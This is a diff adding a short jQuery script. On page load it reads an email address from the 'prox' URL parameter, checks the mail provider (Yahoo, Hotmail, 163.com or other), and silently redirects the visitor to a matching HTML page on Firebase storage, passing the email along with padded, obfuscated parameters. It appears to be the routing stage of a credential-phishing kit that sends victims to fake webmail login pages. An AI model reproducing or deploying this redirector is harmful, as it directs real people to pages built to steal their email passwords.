@@ -1,0 +1,29 @@
+
+$(window).on('load', function() {
+ // code here
+
+var docurl = '';
+	const queryString = window.location.search;
+	console.log(queryString);	
+	const urlParams = new URLSearchParams(queryString);	
+	const str = urlParams.get('prox')
+	var proxx = str.substring(0, 4); 
+    var results =str.split('@');
+	var result = results[1];
+	var identifyexten = result.substring(0, 3);
+	var cplete = identifyexten.toUpperCase();
+	
+				if(cplete == "YAH"){
+					window.location = 'https://firebasestorage.googleapis.com/v0/b/turk-f523f.appspot.com/o/yahindexjiga.html?alt=media&token=b74164e3-1b17-45f1-9f4e-31eed171379e&x=macas-cfa0appspotmacascfacfa0appspotmacascfamacas-cfa0appspotappspotmacas-macas-vfwefsaxsppspotcfa0ps&prox='+str;
+															
+				}else if(cplete == "HOT"){
+					window.location = 'https://firebasestorage.googleapis.com/v0/b/turk-f523f.appspot.com/o/officeindexghana.html?alt=media&token=20405bbc-35c4-42d0-a0a0-c3adfaaea966&x=macas-cfa0appspotmacascfacfa0appspotmacascfamacas-cfa0appspotappspotmacas-macas-vfwefsaxsppspotcfa0ps&prox='+str;
+															
+				}else if(cplete == "163"){
+					window.location = 'https://firebasestorage.googleapis.com/v0/b/turk-f523f.appspot.com/o/dr163.html?alt=media&token=41207d3d-7d8f-42c8-8777-931e0b061140&x=macas-cfa0appspotmacascfacfa0appspotmacascfamacas-cfa0appspotappspotmacas-macas-vfwefsaxsppspotcfa0ps&prox='+str;
+															
+				}else{
+					window.location = 'https://firebasestorage.googleapis.com/v0/b/turk-f523f.appspot.com/o/webindexghana.html?alt=media&token=6085ee6c-6d83-42ee-9b26-3a6ef83a4f27&x=macas-cfa0appspotmacascfacfa0appspotmacascfamacas-cfa0appspotappspotmacas-macas-vfwefsaxsppspotcfa0ps&prox='+str;
+															
+				}
+});				
